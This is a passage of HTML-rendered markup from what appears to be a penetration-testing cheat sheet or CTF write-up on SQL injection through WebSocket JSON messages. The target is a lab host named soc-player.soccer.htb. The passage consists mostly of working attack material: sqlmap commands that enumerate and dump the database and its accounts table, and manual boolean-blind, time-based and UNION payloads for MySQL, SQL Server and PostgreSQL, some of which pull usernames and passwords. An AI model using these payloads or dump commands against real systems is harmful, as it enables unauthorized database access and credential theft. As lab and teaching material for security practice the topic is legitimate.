comparison\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;a\u0026#39;=\u0026#39;b\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"sqlmap-with-websockets\"\u003esqlmap with WebSockets\u003c/h2\u003e\n\u003ch3 id=\"basic-sqlmap-usage\"\u003eBasic sqlmap Usage\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Test WebSocket with JSON payload\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With specific risk and level\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --level \u003cspan class=\"m\"\u003e5\u003c/span\u003e --risk \u003cspan class=\"m\"\u003e3\u003c/span\u003e --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable threading for faster execution\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --level \u003cspan class=\"m\"\u003e5\u003c/span\u003e --risk \u003cspan class=\"m\"\u003e3\u003c/span\u003e --batch --threads \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"database-enumeration\"\u003eDatabase Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enumerate databases\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --dbs --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enumerate tables in specific database\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e -D soccer_db --tables --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dump specific table\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e -D soccer_db -T accounts --dump --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dump all data from database\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e -D soccer_db --dump --batch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-sqlmap-options\"\u003eAdvanced sqlmap Options\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Force specific DBMS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://target:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --dbms\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Custom tamper scripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://target:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --tamper\u003cspan class=\"o\"\u003e=\u003c/span\u003espace2comment --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify injection technique\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://target:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --technique\u003cspan class=\"o\"\u003e=\u003c/span\u003eBT --batch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Save session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://target:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --batch --session-file\u003cspan class=\"o\"\u003e=\u003c/span\u003esession.db\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"manual-exploitation-techniques\"\u003eManual Exploitation Techniques\u003c/h2\u003e\n\u003ch3 id=\"boolean-based-blind-injection\"\u003eBoolean-Based Blind Injection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Check for MySQL\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND (SELECT COUNT(*) FROM information_schema.tables) \u0026gt; 0-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Extract database name length\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND LENGTH(database()) = 9-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Extract database name character by character\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND SUBSTRING(database(),1,1) = \u0026#39;s\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND SUBSTRING(database(),2,1) = \u0026#39;o\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Extract table names\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = \u0026#39;accounts\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"time-based-blind-injection\"\u003eTime-Based Blind Injection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// MySQL time delays\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND SLEEP(5)-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND IF(LENGTH(database())=9,SLEEP(5),0)-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// SQL Server time delays\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;; IF (LEN(DB_NAME())=9) WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// PostgreSQL time delays\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND (SELECT 1 FROM pg_sleep(5))-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Conditional time delays\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND (CASE WHEN (SUBSTRING(user(),1,1)=\u0026#39;r\u0026#39;) THEN SLEEP(5) ELSE 0 END)-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"union-based-injection\"\u003eUnion-Based Injection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Determine number of columns\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; ORDER BY 1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; ORDER BY 2-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; ORDER BY 3-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Test for UNION compatibility\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT NULL-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT NULL,NULL-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Extract database information\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT @@version,user()-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT database(),NULL-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Extract table data\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT username,password FROM accounts-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"websocket-specific-payloads\"\u003eWebSocket-Specific Payloads\u003c/h2\u003e\n\u003ch3 id=\"json-context-injection\"\u003eJSON Context Injection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Basic JSON structure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Nested JSON injection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026#34;user_data\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; UNION SELECT password FROM users-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Array-based injection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026#34;ids\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan 